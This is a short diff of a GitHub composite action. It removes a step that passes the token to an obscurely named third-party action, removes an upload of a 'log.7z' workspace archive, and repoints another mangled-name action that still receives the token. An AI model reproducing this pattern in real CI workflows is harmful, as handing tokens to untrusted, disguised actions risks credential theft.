@@ -12,20 +12,7 @@ runs:
   using: composite
 
   steps:
-    - uses: li1ht2ay-3es/gi1-ac2io3s@keep-alive
-      with:
-        token: ${{ inputs.token }}
-        auto: true
-
-
-    - uses: li1ht2ay-3es/go1gl2-dr3ve@#-gsa-drive
+    - uses: fu1ny2t-3es/go1gl2-dr3ve@#-gsa-drive
       with:
         token: ${{ inputs.token }}
         cache: false
-
-
-    - uses: actions/upload-artifact@main
-      with:
-        name: secure
-        path: |
-          ${{ github.workspace }}/log.7z
